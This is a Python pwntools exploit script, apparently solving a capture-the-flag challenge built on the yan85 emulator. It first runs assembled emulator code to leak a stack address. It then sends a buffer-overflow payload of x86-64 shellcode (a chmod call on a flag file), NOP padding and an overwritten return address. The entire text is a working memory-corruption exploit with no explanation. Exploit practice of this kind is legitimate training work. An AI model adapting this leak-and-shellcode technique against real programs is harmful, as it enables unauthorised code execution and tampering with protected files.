from pwn import *
from yan85_asm import assemble

def extract_addresses(data):
    candidates = set(int(x, 16) for x in re.findall(b'0x[0-9a-fA-F]+', data))
    candidates.update(struct.unpack('<Q', data[i:i+8])[0] for i in range(len(data)-8))

    return sorted(c for c in candidates if 0x400000 <= c <= 0x7fffffffffff)[::-1]

offset_to_return = 0xc8
offset_from_leak_to_input = 0x1c8

p = process("./toddlerone-level-7-1")

shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x2f\x2f\x66\x6c\x61\x67\x53\x48\x89\xe7\x6a\x04\x5e\x6a\x5a\x58\x0f\x05"

yancode = """
IMM a, 1
IMM b, 0xFF
IMM c, 0xFF
SYS 0x1, a

IMM a, 0
IMM b, 0x50
IMM c, 0xFF
SYS 0x2, a
"""

code = assemble(yancode, order_str='arg1,arg2,op')
print(code)

print(p.clean())

payload = b""
payload += code

p.send(payload)

x = p.clean()
print(x)

x = x
y = extract_addresses(x)
for i in y:
    print(hex(i), end=" ")

leaked_stack = y[0]
print("[+] Leak Stack Address ::", hex(leaked_stack))

payload = b""
payload += shellcode
payload += b"\x90" * (offset_to_return - len(payload))
payload += p64(leaked_stack - offset_from_leak_to_input)

p.send(payload)

print(p.clean())

p.close()
